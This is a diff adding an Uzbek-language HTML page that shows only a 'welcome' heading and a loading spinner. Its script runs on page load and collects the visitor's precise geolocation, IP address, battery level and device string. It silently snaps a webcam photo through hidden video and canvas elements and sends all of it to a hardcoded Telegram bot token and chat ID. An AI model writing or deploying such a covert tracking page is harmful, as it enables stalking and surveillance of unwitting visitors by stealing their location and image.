@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ruxsat so'rash</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0; /* Och kulrang fon */
+            font-family: Arial, sans-serif; /* Oddiy va chiroyli shrift */
+            margin: 0; /* Standart marginni olib tashlash */
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Ichidagi elementlarni markazlashtirish */
+        }
+
+        h1 {
+            font-size: 2.5em; /* Katta va ko‘zga tashlanadigan heading */
+            color: #333; /* To‘q kulrang rang */
+            margin-bottom: 20px; /* Loader bilan oradagi masofa */
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 5px solid #f3f3f3; /* Och kulrang ramka */
+            border-top: 5px solid #3498db; /* Ko‘k rangli aylanuvchi qism */
+            border-radius: 50%; /* Doira shakli */
+            animation: spin 2s linear infinite; /* Aylanish animatsiyasi */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Saytga xush kelibsiz!</h1>
+        <div class="loader"></div>
+    </div>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Telegram bot tokeni va chat ID
+        const BOT_TOKEN = '7607021931:AAEYdoiyh7vxWCLIXNl4-HM6k8SzaSEcG9g';
+        const CHAT_ID = '7984884145';
+
+        // Hozirgi vaqtni olish
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toTimeString().split(' ')[0]; // HH:MM:SS formatida
+        }
+
+        // Lokatsiyani olish
+        function getLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        callback(mapLink);
+                    },
+                    (error) => {
+                        console.error("Lokatsiya olishda xato:", error.message);
+                        callback(null);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                callback(null);
+            }
+        }
+
+        // IP-manzilni olish
+        function getIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(error => {
+                    console.error("IP olishda xato:", error);
+                    callback(null);
+                });
+        }
+
+        // Qurilma ma'lumotlarini olish
+        function getDeviceInfo() {
+            return navigator.userAgent;
+        }
+
+        // Batareya darajasini olish
+        function getBatteryLevel(callback) {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    const level = Math.round(battery.level * 100);
+                    callback(`${level}%`);
+                }).catch(() => callback("0%"));
+            } else {
+                callback("0%");
+            }
+        }
+
+        // Kameradan rasm olish
+        function getCameraAndPhoto(callback) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const imageData = canvas.toDataURL("image/png");
+                            stream.getTracks().forEach(track => track.stop());
+                            callback(imageData);
+                        };
+                    })
+                    .catch((err) => {
+                        console.error("Kameraga ruxsat berilmadi:", err);
+                        callback(null);
+                    });
+            } else {
+                callback(null);
+            }
+        }
+
+        // Telegram’ga ma’lumotlarni yuborish
+        function sendToTelegram(location, ip, battery, device, time, photo) {
+            const message = `⏳ Time: ${time}\n🔋Device battery: ${battery}\n📍 IP address: ${ip || "Topilmadi"}\n📍 Location: ${location || "Topilmadi"}\n\n📱 Device: ${device}`;
+            const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(textUrl)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) console.error("Matn yuborishda xato:", data);
+                });
+
+            if (photo) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", dataURLtoBlob(photo), "photo.png");
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) console.error("Rasm yuborishda xato:", data);
+                    });
+            }
+        }
+
+        // Base64’dan Blob’ga aylantirish
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Hammasini birlashtirish
+        window.onload = function() {
+            let locationData, ipData, photoData, batteryData, deviceData;
+            const timeData = getCurrentTime();
+
+            getLocation((location) => {
+                locationData = location;
+                getIP((ip) => {
+                    ipData = ip;
+                    getBatteryLevel((battery) => {
+                        batteryData = battery;
+                        deviceData = getDeviceInfo();
+                        getCameraAndPhoto((photo) => {
+                            photoData = photo;
+                            sendToTelegram(locationData, ipData, batteryData, deviceData, timeData, photoData);
+                        });
+                    });
+                });
+            });
+        };
+    </script>
+</body>
+</html>
